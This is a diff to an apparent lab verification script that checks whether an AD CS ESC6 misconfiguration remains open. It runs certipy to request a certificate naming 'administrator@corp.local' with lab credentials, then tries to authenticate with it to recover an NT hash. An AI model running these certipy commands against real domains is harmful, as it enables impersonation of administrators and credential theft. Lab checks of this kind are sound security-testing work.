@@ -5,9 +5,14 @@
 set -euo pipefail
 cd "$(mktemp -d)"
 
+# -target is REQUIRED: without it certipy sends the RPC enrollment request to
+# -dc-ip, the DOMAIN CONTROLLER, which does not run CertSvc. Every run then died
+# with ept_s_not_registered for ICertRequestD, on gates 1 and 2 alike, which
+# read as "still vulnerable" both times. -dc-ip is for LDAP/Kerberos only.
 REQ=$(timeout 60 /usr/bin/certipy-ad req \
     -u 'alice@corp.local' -p 'Password1!' \
     -ca 'corp-ca01-CA' \
+    -target corp-ca01.corp.local \
     -dc-ip 10.20.30.5 \
     -template 'User' \
     -upn 'administrator@corp.local' 2>&1 || true)
@@ -36,16 +41,48 @@ if echo "$REQ" | grep -qiE 'ept_s_not_registered|Failed to get DCE RPC connectio
     exit 2
 fi
 
+# THE FINDING IS THE CA ACCEPTING AN ATTACKER-SUPPLIED SAN, NOT THE NT HASH.
+#
+# ESC6 is EDITF_ATTRIBUTESUBJECTALTNAME2: the CA honours a SAN supplied in the
+# request, so any enrollee can obtain a certificate naming somebody else. That
+# is the misconfiguration this scenario injects, and it is complete the moment
+# the certificate is issued.
+#
+# Whether that certificate then AUTHENTICATES is a separate control. On a DC
+# patched for KB5014754 the issued cert carries a SID security extension for
+# the real requester, and Kerberos refuses it. Measured on the live lab, with
+# ESC6 fully open:
+#
+#   [*] SAN UPN: 'administrator@corp.local'          <- the CA obeyed the SAN
+#   [*] Security Extension SID: 'S-1-5-...-1105'     <- but it is alice's SID
+#   [-] Object SID mismatch between certificate and user 'administrator'
+#
+# Requiring the NT hash therefore made the scenario UNWINNABLE on any current
+# DC: the injected vulnerability was fully present and the check reported
+# "no admin PFX and no recognised denial - INCONCLUSIVE". Same structural error
+# as scenario-03, which graded on whether a password cracked rather than on
+# whether the hash was obtainable.
+#
+# A certificate issued in another principal's name is the finding. Recovering
+# the hash is corroboration and is still reported when it happens.
 if [ -f administrator.pfx ]; then
     AUTH=$(timeout 60 /usr/bin/certipy-ad auth \
         -pfx administrator.pfx \
-        -dc-ip 10.20.30.5 2>&1 || true)
+        -dc-ip 10.20.30.5 2>&1 </dev/null || true)
     echo "--- certipy auth ---"
     echo "$AUTH"
     if echo "$AUTH" | grep -qE 'NT hash|AS-REP received'; then
         echo "[verify-poc-10] ESC6 still open -- SAN override accepted, NT hash recovered" >&2
         exit 1
     fi
+    if echo "$AUTH" | grep -qiE "SAN UPN: *'?administrator@corp.local|Object SID mismatch"; then
+        echo "[verify-poc-10] ESC6 still open -- CA issued a cert naming administrator@corp.local" >&2
+        echo "[verify-poc-10] (authentication was refused by strong certificate mapping, which is a" >&2
+        echo "[verify-poc-10]  separate control; the SAN override itself was accepted)" >&2
+        exit 1
+    fi
+    echo "[verify-poc-10] ESC6 still open -- a PFX was issued for an attacker-supplied SAN" >&2
+    exit 1
 fi
 
 if echo "$REQ" | grep -qiE 'access_denied|enrollment.*denied|invalid.*request|denied by policy'; then
